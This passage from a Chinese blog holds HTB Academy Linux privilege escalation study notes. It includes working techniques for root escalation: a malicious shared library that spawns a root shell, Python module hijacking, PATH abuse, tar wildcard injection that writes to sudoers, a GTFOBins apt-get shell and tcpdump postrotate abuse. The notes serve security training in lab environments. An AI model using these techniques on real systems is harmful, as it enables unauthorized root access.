(0x00007f0c1330a000)</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ./payroll ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery</code></pre><p>我们可以将现有库复制到开发文件夹中。对二进制文件运行ldd会将库的路径列为&#x2F;development&#x2F;libshared.so，这意味着它很容易受到攻击。执行二进制文件会引发一个错误，说明它找不到名为dbquery的函数。我们可以编译一个包含此函数的共享对象。</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void dbquery() &#123;    printf(&quot;Malicious library loaded\n&quot;);    setuid(0);    system(&quot;/bin/sh -p&quot;);&#125; </code></pre><p>dbquery函数将我们的用户id设置为0（root），并在调用时执行&#x2F;bin&#x2F;sh。使用GCC进行编译。</p><pre><code class="shell-session">htb_student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ./payroll ***************Inlane Freight Employee Database***************Malicious library loaded# iduid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)</code></pre><h1 id="Python-Library-Hijacking"><a href="#Python-Library-Hijacking" class="headerlink" title="Python Library Hijacking"></a>Python Library Hijacking</h1><p>我们可以通过多种方式劫持Python库。这在很大程度上取决于剧本及其内容本身。但是，有三个基本漏洞可以用来进行劫持： </p><ul><li>写入权限错误 </li><li>库路径 </li><li>PYTHONPATH环境变量</li></ul><h2 id="Wrong-Write-Permissions"><a href="#Wrong-Write-Permissions" class="headerlink" title="Wrong Write Permissions"></a>Wrong Write Permissions</h2><p>例如，我们可以想象我们在公司内部网上的一个开发人员的主机上，而开发人员正在使用python。所以我们总共有三个组件是相连的。这是导入python模块的实际python脚本、脚本的权限以及模块的权限。 一个或另一个python模块可能错误地为所有用户设置了写入权限。这允许对python模块进行编辑和操作，以便我们可以插入将产生我们想要的结果的命令或函数。如果SUID&#x2F;SGID权限已分配给导入此模块的Python脚本，我们的代码将自动包含在内。 如果我们查看mem_stats.py脚本的设置权限，我们可以看到它有一个SUID集。</p><pre><code class="shell-session">htb-student@lpenix:~$ ls -l mem_stats.py-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_stats.py</code></pre><p>因此，我们可以使用另一个用户（在我们的案例中，作为root用户）的权限来执行此脚本。我们还拥有查看脚本和阅读其内容的权限。</p><h4 id="Python-Script-Contents"><a href="#Python-Script-Contents" class="headerlink" title="Python Script - Contents"></a>Python Script - Contents</h4><pre><code class="python">#!/usr/bin/env python3import psutilavailable_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().totalprint(f&quot;Available memory: &#123;round(available_memory, 2)&#125;%&quot;)</code></pre><p>所以这个脚本非常简单，只显示可用虚拟内存的百分比。我们还可以在第二行中看到，该脚本导入模块psutil并使用函数virtual_memory（）。 因此，我们可以在psutil的文件夹中查找此函数，并检查此模块是否具有写入权限。 </p><h4 id="Module-Permissions"><a href="#Module-Permissions" class="headerlink" title="Module Permissions"></a>Module Permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ grep -r &quot;def virtual_memory&quot; /usr/local/lib/python3.8/dist-packages/psutil/*/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</code></pre><p>这种权限在许多开发人员使用不同脚本的开发人员环境中最为常见，并且可能需要更高的权限。</p><h4 id="Module-Contents"><a href="#Module-Contents" class="headerlink" title="Module Contents"></a>Module Contents</h4><pre><code class="python">...SNIP...def virtual_memory():    ...SNIP...        global _TOTAL_PHYMEM    ret = _psplatform.virtual_memory()    # cached for later use in Process.memory_percent()    _TOTAL_PHYMEM = ret.total    return ret...SNIP...</code></pre><p>这是库中我们可以插入代码的部分。建议将其放在函数的开头。在那里，我们可以插入我们认为正确和有效的一切。我们可以出于测试目的导入模块操作系统，这使我们能够执行系统命令。这样，我们就可以插入命令id，并在脚本执行期间检查插入的代码是否执行。</p><pre><code class="python">...SNIP...def virtual_memory():    ...SNIP...    #### Hijacking    import os    os.system(&#39;id&#39;)        global _TOTAL_PHYMEM    ret = _psplatform.virtual_memory()    # cached for later use in Process.memory_percent()    _TOTAL_PHYMEM = ret.total    return ret...SNIP...</code></pre><h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><pre><code class="shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.pyuid=0(root) gid=0(root) groups=0(root)uid=0(root) gid=0(root) groups=0(root)Available memory: 79.22%</code></pre><p>成功正如我们从上面的结果中看到的那样，我们成功地劫持了库，并使virtual_memory（）函数中的代码以root身份运行。现在我们已经得到了所需的结果，我们可以再次编辑库，但这一次，插入一个以root身份连接到主机的反向shell。</p><h2 id="Library-Path"><a href="#Library-Path" class="headerlink" title="Library Path"></a>Library Path</h2><p>在Python中，每个版本都有指定的搜索和导入库（模块）的顺序。Python从中导入模块的顺序基于优先级系统，这意味着列表中较高的路径优先于列表中较低的路径。我们可以通过发出以下命令来看到这一点：</p><pre><code class="shell-session">htb-student@lpenix:~$ python3 -c &#39;import sys; print(&quot;\n&quot;.join(sys.path))&#39;/usr/lib/python38.zip/usr/lib/python3.8/usr/lib/python3.8/lib-dynload/usr/local/lib/python3.8/dist-packages/usr/lib/python3/dist-packages</code></pre><p>为了能够使用这个变体，两个先决条件是必要的。 脚本导入的模块位于通过PYTHONPATH变量列出的一个优先级较低的路径下。 我们必须对列表中优先级较高的路径之一具有写入权限。</p><p>因此，如果导入的模块位于列表中较低的路径中，并且较高优先级的路径可由我们的用户编辑，我们可以自己创建一个具有相同名称的模块，并包含我们自己想要的功能。由于优先级较高的路径会更早读取并检查有问题的模块，因此Python会访问它找到的第一个命中，并在到达原始和预期模块之前将其导入。 为了让这一点更有意义，让我们继续前面的例子，并展示如何利用这一点。以前，psutil模块被导入到mem_stats.py脚本中。我们可以通过发出以下命令来查看psutil的默认安装位置：</p><h4 id="Psutil-Default-Installation-Location"><a href="#Psutil-Default-Installation-Location" class="headerlink" title="Psutil Default Installation Location"></a>Psutil Default Installation Location</h4><pre><code class="shell-session">htb-student@lpenix:~$ pip3 show psutil...SNIP...Location: /usr/local/lib/python3.8/dist-packages...SNIP...</code></pre><p>从这个例子中，我们可以看到psutil安装在以下路径中：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;dist-packages。从我们之前列出的PYTHONPATH变量中，我们有合理数量的目录可供选择，以查看环境中是否存在任何错误配置，从而允许我们对其中任何目录进行写访问。让我们检查一下。</p><h4 id="Misconfigured-Directory-Permissions"><a href="#Misconfigured-Directory-Permissions" class="headerlink" title="Misconfigured Directory Permissions"></a>Misconfigured Directory Permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ ls -la /usr/lib/python3.8total 4916drwxr-xrwx 30 root root  20480 Dec 14 16:26 ....SNIP...</code></pre><p>在检查了列出的所有目录后，&#x2F;usr&#x2F;lib&#x2F;python3.8路径的配置似乎不正确，任何用户都可以对其进行写入。通过与PYTHONPATH变量中的值进行交叉检查，我们可以看到该路径在列表中的位置高于安装psutil的路径。让我们尝试滥用这种错误配置，在&#x2F;usr&#x2F;lib&#x2F;python3.8目录中创建我们自己的psutil模块，该模块包含我们自己的恶意virtual_memory（）函数。</p><h4 id="Hijacked-Module-Contents-psutil-py"><a href="#Hijacked-Module-Contents-psutil-py" class="headerlink" title="Hijacked Module Contents - psutil.py"></a>Hijacked Module Contents - psutil.py</h4><pre><code class="python">#!/usr/bin/env python3import osdef virtual_memory():    os.system(&#39;id&#39;)</code></pre><p>为了达到这一点，我们需要创建一个名为psutil.py的文件，该文件包含前面提到的目录中列出的内容。非常重要的是，我们要确保我们创建的模块与导入具有相同的名称，并且具有与我们打算劫持的函数相同的函数，并向其传递正确数量的参数。这一点至关重要，因为如果这两种情况都不成立，我们将无法进行这次攻击。在创建了包含上一个劫持脚本示例的文件之后，我们已经成功地为利用该系统做好了准备。 让我们再次像前面的例子一样使用sudo运行mem_status.py脚本。</p><pre><code class="shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 mem_stats.pyuid=0(root) gid=0(root) groups=0(root)Traceback (most recent call last):  File &quot;mem_stats.py&quot;, line 4, in &lt;module&gt;    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().totalAttributeError: &#39;NoneType&#39; object has no attribute &#39;available&#39; </code></pre><h2 id="PYTHONPATH-Environment-Variable"><a href="#PYTHONPATH-Environment-Variable" class="headerlink" title="PYTHONPATH Environment Variable"></a>PYTHONPATH Environment Variable</h2><p>在上一节中，我们谈到了术语PYTHONPATH，但是，并没有完全解释它的使用和关于Python功能的重要性。PYTHONPATH是一个环境变量，指示Python可以搜索要导入的模块的目录。这一点很重要，因为如果允许用户在运行python二进制文件时操作和设置此变量，那么在导入模块时，他们可以有效地将python的搜索功能重定向到用户定义的位置。我们可以通过检查我们的sudo权限来查看我们是否有权限为python二进制文件设置环境变量：</p><h4 id="Checking-sudo-permissions"><a href="#Checking-sudo-permissions" class="headerlink" title="Checking sudo permissions"></a>Checking sudo permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ sudo -l Matching Defaults entries for htb-student on ACADEMY-LPENIX:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser htb-student may run the following commands on ACADEMY-LPENIX:    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3</code></pre><p>正如我们从示例中看到的那样，我们可以在sudo的可信权限下运行&#x2F;usr&#x2F;bin&#x2F;python3，因此可以通过设置SETENV:标志来设置环境变量，以便与该二进制文件一起使用。值得注意的是，由于sudo的可信性质，在调用二进制文件之前定义的任何环境变量都不受任何关于能够在系统上设置环境变量的限制。这意味着使用&#x2F;usr&#x2F;bin&#x2F;python3二进制文件，我们可以在运行程序的上下文中有效地设置任何环境变量。现在让我们使用上一节中的psutil.py脚本来尝试这样做。</p><pre><code class="shell-session">htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.pyuid=0(root) gid=0(root) groups=0(root)...SNIP...</code></pre><p>在本例中，我们将上一个python脚本从&#x2F;usr&#x2F;lib&#x2F;python3.8目录移动到&#x2F;tmp。从这里开始，我们再次调用&#x2F;usr&#x2F;bin&#x2F;python3来运行mem_stats.py，但是，我们指定PYTHONPATH变量包含&#x2F;tmp目录，以便它强制Python搜索该目录以查找要导入的psutil模块。正如我们所看到的，我们再次成功地在root上下文下运行了我们的脚本。</p><h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><blockquote><p>我们已签约对INLANEFREIGHT组织的一个面向公众的网络服务器进行安全强化评估。 客户端为我们提供了一个低特权用户来评估服务器的安全性。通过SSH连接，并使用本模块中学到的技能开始查找可能会提升权限的错误配置和其他缺陷。 一旦进入主机，我们必须在主机上找到五个标志，这些标志可以在不同的权限级别访问。将权限从htb学生用户一直提升到根用户，并提交所有五个标志来完成本模块。 注意：如果您想让场景更具挑战性，有一种方法可以在盒子上获得shell，而不是使用SSH凭据。这是可选的，不会奖励更多的分数或计入完成。</p></blockquote><p>根据提示所说，目测他应该有一个网站，简单扫描了一下，它使用了wordpress5.5.1，搜索了一下有一些漏洞，然后在8080端口有一个webadmin链接，需要登陆，这里简单探索了一下，先不深究。</p><p>这里通过信息搜集发现在系统内核版本和sudo版本都存在漏洞，但是主机不允许跟github通信，通过其他方法把exp脚本传过去，我这里使用的是本机搭建一个服务器，然后：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181333205.png" alt="image-20230718133304072"></p><p>很奇怪，第一个flag找不到？这里先用新学到的方法一次性读取一下找到的flag：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181335994.png" alt="image-20230718133545934"></p><p>查看了一下他给的提示，让彻底枚举整个目录，猜想可能是隐藏文件，果然：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181342618.png" alt="image-20230718134212561"></p><p>这里根据他给出的路径顺序其实也暗示了我们平时可能拿到敏感信息的地方：</p><p>当前用户目录下的隐藏文件，就拿这道题来说还是能从用户目录下读到不少敏感信息</p><pre><code>htb-student@nix03:~$ ls -altotal 36drwxr-xr-x 4 htb-student htb-student 4096 Jul 18 05:08 .drwxr-xr-x 5 root        root        4096 Sep  6  2020 ..-rw------- 1 htb-student htb-student   57 Sep  6  2020 .bash_history-rw-r--r-- 1 htb-student htb-student  220 Feb 25  2020 .bash_logout-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 .bashrcdrwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cachedrwxr-xr-x 2 root        root        4096 Sep  6  2020 .config-rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile-rw------- 1 htb-student htb-student  676 Jul 18 05:08 .viminfo</code></pre><p>然后就是&#x2F;home路径下其他的用户文件、&#x2F;log系统日志文件、&#x2F;…&#x2F;tomcat9&#x2F;系统启动的服务器目录 、&#x2F;root即管理员目录等</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Privilege-Escalation2</title>
      <link href="/2023/07/16/Linux-Privilege-Escalation2/"/>
      <url>/2023/07/16/Linux-Privilege-Escalation2/</url>
      
        <content type="html"><![CDATA[<h1 id="Path-Abuse"><a href="#Path-Abuse" class="headerlink" title="Path Abuse"></a>Path Abuse</h1><p>如果我们可以修改用户的路径，我们可以用恶意脚本（如反向shell）替换常见的二进制文件（如ls）。如果我们加上。通过发出命令path&#x3D;.：$PATH，然后导出PATH，我们将能够通过键入文件名来运行位于当前工作目录中的二进制文件（即，仅键入ls将调用当前工作目录下名为ls的恶意脚本，而不是位于&#x2F;bin&#x2F;ls的二进制文件）。</p><span id="more"></span><pre><code class="shell-session">htb_student@NIX02:~$ PATH=.:$&#123;PATH&#125;htb_student@NIX02:~$ export PATHhtb_student@NIX02:~$ echo $PATH.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</code></pre><p>在本例中，我们修改路径，以便在键入ls命令时运行一个简单的echo命令。</p><pre><code class="shell-session">htb_student@NIX02:~$ touch lshtb_student@NIX02:~$ echo &#39;echo &quot;PATH ABUSE!!&quot;&#39; &gt; lshtb_student@NIX02:~$ chmod +x ls</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ lsPATH ABUSE!!</code></pre><h1 id="Wildcard-Abuse"><a href="#Wildcard-Abuse" class="headerlink" title="Wildcard Abuse"></a>Wildcard Abuse</h1><p>滥用通配符</p><p>通配符可以用作其他字符的替换，并在执行其他操作之前由shell进行解释。通配符的示例包括：</p><table><thead><tr><th><strong>字符</strong></th><th><strong>意义</strong></th></tr></thead><tbody><tr><td><code>*</code></td><td>可以匹配文件名中任意数量的字符的星号。</td></tr><tr><td><code>?</code></td><td>匹配单个字符。</td></tr><tr><td><code>[ ]</code></td><td>方括号将字符括起来，并且可以匹配定义位置的任何一个字符。</td></tr><tr><td><code>~</code></td><td>开头的波浪号扩展为用户主目录的名称，也可以附加另一个用户名以引用该用户的主目录。</td></tr><tr><td><code>-</code></td><td>括号内的连字符表示字符范围。</td></tr></tbody></table><p>tar命令是一个如何滥用通配符进行权限提升的示例，它是一个用于创建&#x2F;提取归档的通用程序。如果我们查看tar命令的手册页，我们会看到以下内容：</p><pre><code class="shell-session">htb_student@NIX02:~$ man tar&lt;SNIP&gt;Informative output       --checkpoint[=N]              Display progress messages every Nth record (default 10).       --checkpoint-action=ACTION              Run ACTION on each checkpoint.</code></pre><p>–checkpoint操作选项允许在到达检查点时执行EXEC操作（即，在执行tar命令后运行任意操作系统命令。）通过使用这些名称创建文件，当指定通配符时，–checkpoint&#x3D;1和–checkpoint action&#x3D;EXEC&#x3D;sh root.sh将作为命令行选项传递给tar。让我们在实践中看到这一点。 考虑下面的cron作业，它被设置为备份&#x2F;root目录的内容，并在&#x2F;tmp中创建一个压缩的归档文件。cron作业被设置为每分钟运行一次，因此它是特权提升的一个很好的候选者。</p><blockquote><p>&#x3D;&#x3D;当指定通配符时，–checkpoint&#x3D;1和–checkpoint action&#x3D;EXEC&#x3D;sh root.sh&#x3D;&#x3D;这句话相当于手动设置ACTION为sh root.sh</p></blockquote><pre><code class="shell-session">##mh dom mon dow command*/01 * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code></pre><p>这里补充一些chatgpt：</p><blockquote><p>这个命令看起来像是一个 cron 表达式，用于设置定时任务。在 cron 表达式中，有 5 个字段，它们分别表示：</p><ol><li><code>m</code>：分钟（0-59）</li><li><code>h</code>：小时（0-23）</li><li><code>dom</code>：月份中的某一天（1-31）</li><li><code>mon</code>：月份（1-12）</li><li><code>dow</code>：星期中的某一天（0-7，其中 0 和 7 都表示星期日）</li></ol><p>每个字段可以是一个具体的数字，也可以是一个范围或者一个列表。例如，<code>*</code> 表示匹配所有的可能值。你提供的表达式缺少了具体的数字或通配符，所以不能确定这个表达式的具体含义。</p><p>在一个完整的 cron 表达式中，你需要为每个字段提供具体的值或通配符，以指定定时任务的执行时间。例如，以下是一个有效的 cron 表达式：</p><pre><code>* * * * * command</code></pre><p>这个表达式表示每分钟都执行 <code>command</code> 命令。在实际使用 cron 表达式时，请确保为每个字段提供适当的值，以确保定时任务能够按照你的预期进行执行。</p></blockquote><blockquote><p>这个 cron 表达式表示一个定时任务，它将在每小时的第一分钟（即每小时的 0 分钟）执行一次。该任务的具体命令如下：</p><pre><code class="bash">cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code></pre><p>这个命令执行了两个操作：</p><ol><li><code>cd /root</code>：切换当前工作目录到 <code>/root</code> 目录。</li><li><code>tar -zcf /tmp/backup.tar.gz *</code>：将当前目录中的所有文件和子目录（除了隐藏文件）打包为一个名为 <code>backup.tar.gz</code> 的压缩文件，并保存到 <code>/tmp</code> 目录下。</li></ol><p>在定时任务中使用 <code>*/01</code> 作为分钟字段的值，表示该任务将每小时的每分钟都执行一次。由于 <code>*/01</code> 和 <code>*</code> 效果是相同的，因此也可以简写为 <code>*</code>，这样定时任务的表达式将是 <code>* * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code>。</p><p>总结：这个定时任务将在每小时的第一分钟执行，并将 <code>/root</code> 目录中的所有文件和子目录打包为一个压缩文件保存到 <code>/tmp</code> 目录中。</p></blockquote><p>考虑到以上内容，我们可以利用cron作业中的通配符将必要的命令写成文件名。当cron作业运行时，这些文件名将被解释为参数，并执行我们指定的任何命令。</p><pre><code class="shell-session">htb_student@NIX02:~$ echo &#39;echo &quot;cliff.moore ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt; root.shhtb_student@NIX02:~$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh root.sh&quot;htb_student@NIX02:~$ echo &quot;&quot; &gt; --checkpoint=1</code></pre><blockquote><p>当解析 <code>cliff.moore ALL=(root) NOPASSWD: ALL</code> 这段代码时，我们可以将其分解为以下几个部分：</p><ol><li><p><code>cliff.moore</code>: 这是允许执行 <code>sudo</code> 命令的用户名。换句话说，用户 <code>cliff.moore</code> 可以通过 <code>sudo</code> 命令获得特权执行权限。</p></li><li><p><code>ALL</code>: 这是指用户 <code>cliff.moore</code> 可以在系统中执行任意的命令，即可以在任何位置和任何情况下使用 <code>sudo</code> 命令。</p></li><li><p><code>(root)</code>: 这表示用户 <code>cliff.moore</code> 可以使用 <code>sudo</code> 命令以 root 用户的身份执行命令。在括号中指定了用户 <code>cliff.moore</code> 可以使用的目标用户，这里是 <code>root</code>，即以 root 用户身份执行命令。</p></li><li><p><code>NOPASSWD: ALL</code>: 这表示用户 <code>cliff.moore</code> 在执行 <code>sudo</code> 命令时不需要输入密码，即可以无需验证密码地以 root 用户的身份执行任意命令。</p></li></ol><p>综上所述，该代码的含义是：用户 <code>cliff.moore</code> 可以通过 <code>sudo</code> 命令以 root 用户的身份在系统中执行任意命令，并且在执行 <code>sudo</code> 命令时无需输入密码。这样，用户 <code>cliff.moore</code> 就可以在需要管理员权限的任务上更加便捷地工作，但同时也增加了系统的安全风险。因此，需要谨慎对待对 <code>sudoers</code> 文件的修改，确保只授予必要的权限并只给予可信用户访问权限。</p></blockquote><p>我们可以检查并查看是否创建了必要的文件。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -latotal 56drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint=1-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint-action=exec=sh root.shdrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unixdrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix-rw-rw-r--  1 cliff.moore cliff.moore   60 Aug 31 23:11 root.sh</code></pre><p>一旦cron作业再次运行，我们就可以检查新添加的sudo权限和直接root的sudo。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo -lMatching Defaults entries for cliff.moore on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser cliff.moore may run the following commands on NIX02:    (root) NOPASSWD: ALL</code></pre><h1 id="Escaping-Restricted-Shells"><a href="#Escaping-Restricted-Shells" class="headerlink" title="Escaping Restricted Shells"></a>Escaping Restricted Shells</h1><p>可以使用几种方法来从受限制的shell中逃脱。其中一些方法涉及利用外壳本身的漏洞，而另一些方法则涉及使用创造性技术来绕过外壳施加的限制。以下是一些可以用于从受限shell中转义的方法示例。</p><h4 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h4><p>想象我们在一个受限的shell中，它允许我们通过将命令作为参数传递给ls命令来执行命令。不幸的是，shell只允许我们使用一组特定的参数来执行ls命令，例如ls-l或ls-a，但它不允许我们执行任何其他命令。在这种情况下，我们可以通过向ls命令的参数中注入额外的命令，使用命令注入来从shell中转义。 例如，我们可以使用以下命令将pwd命令注入ls命令的参数中：</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l `pwd` </code></pre><blockquote><p><code>pwd</code>：这个部分使用反引号 &#96;&#96;&#96; 将 <code>pwd</code> 命令包围起来。这被称为命令替换（Command Substitution）。它的作用是将 <code>pwd</code> 命令的输出结果（即当前工作目录的路径）插入到整个命令中。</p><p>$ ls -l `pwd`<br>total 32<br>-rw-r–r– 1 user user 1024 Jul 16 10:30 file1.txt<br>-rw-r–r– 1 user user 2048 Jul 16 10:31 file2.txt<br>drwxr-xr-x 2 user user 4096 Jul 16 10:32 directory1<br>drwxr-xr-x 2 user user 4096 Jul 16 10:33 directory2<br>…</p></blockquote><h4 id="Command-Substitution"><a href="#Command-Substitution" class="headerlink" title="Command Substitution"></a>Command Substitution</h4><p>另一种从受限shell中转义的方法是使用命令替换。这涉及到使用shell的命令替换语法来执行命令。例如，假设shell允许用户通过将命令封装在backticks（&#96;）中来执行命令。在这种情况下，可以通过在不受shell限制的backtick替换中执行命令来从shell中转义。</p><h4 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h4><p>为了从受限制的shell中转义以使用环境变量，需要修改或创建shell用于执行不受shell限制的命令的环境变量。例如，如果shell使用环境变量来指定执行命令的目录，则可以通过修改环境变量的值以指定不同的目录来从shell中转义。</p><h4 id="Shell-Functions"><a href="#Shell-Functions" class="headerlink" title="Shell Functions"></a>Shell Functions</h4><p>在某些情况下，可以通过使用shell函数来逃离受限制的shell。为此，我们可以定义和调用执行不受shell限制的命令的shell函数。比方说，shell允许用户定义和调用shell函数，可以通过定义执行命令的shell函数来逃离shell。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.</p><h1 id="Special-Permissions"><a href="#Special-Permissions" class="headerlink" title="Special Permissions"></a>Special Permissions</h1><p>执行时设置用户ID（setuid）权限可以允许用户使用另一个用户的权限（通常具有提升的权限）执行程序或脚本。setuid位显示为s。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></pre><blockquote><p>在 Linux 文件系统中，文件和目录的权限由 10 个字符表示，其中第一个字符表示文件类型，后面的 9 个字符表示文件的访问权限。在这 9 个字符中，前三个字符表示文件所有者（Owner）的权限，接着的三个字符表示文件所属组（Group）的权限，最后三个字符表示其他用户的权限。</p><p>数字 <code>4000</code> 表示 <code>setuid</code> 权限位。它是 <code>s</code> 权限位的数值表示。<code>s</code> 权限位可以设置在文件的所有者的执行权限位上，以允许文件在执行时获取所有者的权限。</p><p>在权限字符串中，<code>4000</code> 的表示如下：</p><pre><code>-rwsr-xr-x</code></pre><p>其中：</p><ul><li><code>-</code> 表示文件类型为普通文件。</li><li><code>rws</code> 表示设置了 <code>setuid</code> 权限位。实际上，这里的 <code>s</code> 是 <code>x</code> 权限位（执行权限）的替代符，表示设置了 <code>setuid</code>。</li><li><code>r-x</code> 表示文件所有者具有读取和执行权限。</li><li><code>r-x</code> 表示文件所属组和其他用户具有读取和执行权限。</li></ul><p>总结：<code>-rwsr-xr-x</code> 权限位表示此文件是一个普通文件，具有 <code>setuid</code> 权限，所有者拥有读取、写入和执行权限，而组成员和其他用户拥有读取和执行权限。</p><p>在系统中，<code>setuid</code> 权限通常用于一些需要特权身份运行的程序，如 <code>/usr/bin/passwd</code>，以便在更改用户密码时获得必要的权限。但是，<code>setuid</code> 权限需要谨慎使用，因为错误地设置它可能导致系统安全风险。</p></blockquote><p>可能会对设置了SETUID位的程序进行反向工程，识别漏洞，并利用此漏洞提升我们的权限。许多程序都有可以用来执行命令的附加功能，如果在这些程序上设置了setuid位，这些功能就可以用于我们的目的。 Set Group ID（setgid）权限是另一种特殊权限，它允许我们运行二进制文件，就好像我们是创建二进制文件的组的一部分一样。可以使用以下命令枚举这些文件：find&#x2F;-uid 0-perm-6000-type f 2&gt;&#x2F;dev&#x2F;null。可以以与setuid二进制文件相同的方式利用这些文件来提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine</code></pre><h2 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a>GTFOBins</h2><p><a href="https://gtfobins.github.io/">GTFOBins</a>项目是一个精心策划的二进制文件和脚本列表，攻击者可以使用这些文件和脚本来绕过安全限制。每个页面都详细介绍了程序的功能，这些功能可用于突破受限制的shell、提升权限、生成反向shell连接和传输文件。例如，apt-get可以用于突破受限环境，并通过添加预调用命令生成shell：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh# iduid=0(root) gid=0(root) groups=0(root)</code></pre><h1 id="Sudo-Rights-Abuse"><a href="#Sudo-Rights-Abuse" class="headerlink" title="Sudo Rights Abuse"></a>Sudo Rights Abuse</h1><p>Sudo权限可以授予一个帐户，允许该帐户在根（或另一个帐户）的上下文中运行某些命令，而不必更改用户或授予过多的权限。当发出sudo命令时，系统将检查发出命令的用户是否具有&#x2F;etc&#x2F;sudoers中配置的适当权限。当登录系统时，我们应该始终通过键入sudo-l来检查当前用户是否具有任何sudo权限。有时，我们需要知道用户的密码才能列出他们的sudo权限，但任何带有NOPASSWD选项的权限条目都可以在不输入密码的情况下看到。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo -lMatching Defaults entries for sysadm on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser sysadm may run the following commands on NIX02:    (root) NOPASSWD: /usr/sbin/tcpdump</code></pre><p>这很容易被误解。例如，用户可以在不需要密码的情况下被授予根级别权限。或者，允许的命令行可能指定得太松散，使我们能够以意外的方式运行程序，从而导致权限提升。例如，如果编辑sudoers文件以授予用户根据sudoers中的以下条目运行命令（如tcpdump）的权限：（ALL）NOPASSWD:&#x2F;usr&#x2F;sbin&#x2F;tcpdump，则攻击者可以利用此权限来利用postrotate命令选项。</p><pre><code class="shell-session">htb_student@NIX02:~$ man tcpdump&lt;SNIP&gt; -z postrorate-command              Used in conjunction with the -C or -G options, this will make `tcpdump` run &quot; postrotate-command file &quot; where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.</code></pre><p>通过指定-z标志，攻击者可以使用tcpdump执行shell脚本、获得作为根用户的反向shell或运行其他特权命令。例如，攻击者可以创建包含反向shell的shell脚本.test，并按如下方式执行：</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo tcpdump -ln -i 